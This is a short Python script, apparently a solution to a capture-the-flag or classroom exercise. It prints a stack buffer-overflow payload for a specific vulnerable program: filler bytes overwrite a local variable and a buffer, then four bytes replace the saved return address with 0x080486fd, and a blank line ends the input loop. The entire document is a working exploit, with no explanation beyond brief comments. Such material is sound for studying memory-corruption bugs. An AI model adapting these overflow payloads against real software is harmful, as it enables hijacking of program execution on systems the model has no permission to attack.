# overwrite locals.i
print("X"*12)
 
# fill locals.cat_buf and gap to ebp+0x04
for i in range(20):
  print("X")
 
# overwrite return address
print("\xfd")
print("\x86")
print("\x04")
print("\x08")
 
# input empty line to exit loop
print("")
